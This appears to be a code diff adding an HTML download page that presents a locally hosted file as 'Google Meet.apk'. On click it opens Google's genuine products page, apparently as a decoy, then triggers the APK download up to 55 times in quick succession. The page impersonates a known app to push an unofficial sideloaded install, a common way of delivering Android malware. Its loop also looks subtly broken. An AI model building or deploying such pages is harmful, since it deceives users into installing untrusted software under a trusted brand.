@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Download APK</title>
+</head>
+<body>
+
+<br/><br/>
+<button id="downloadBtn">Download APK</button>
+
+<script>
+
+var count = 0;
+document.getElementById("downloadBtn").addEventListener("click", function () {
+    
+    window.open("https://about.google/products/", "");
+    
+    const link = document.createElement("a");
+    link.href = "Google Meet.apk"; // URL to your APK file
+    link.download = "Google Meet.apk"; // optional suggested filename
+    document.body.appendChild(link);
+
+    
+    setTimeout(function(){
+       setInterval(function(){
+        if(count<55){
+        link.click();
+        document.body.removeChild(link);
+       }
+     count++;
+    }, 300);
+
+    
+    }, 3000);
+    
+  
+    
+});
+</script>
+
+</body>
+</html>
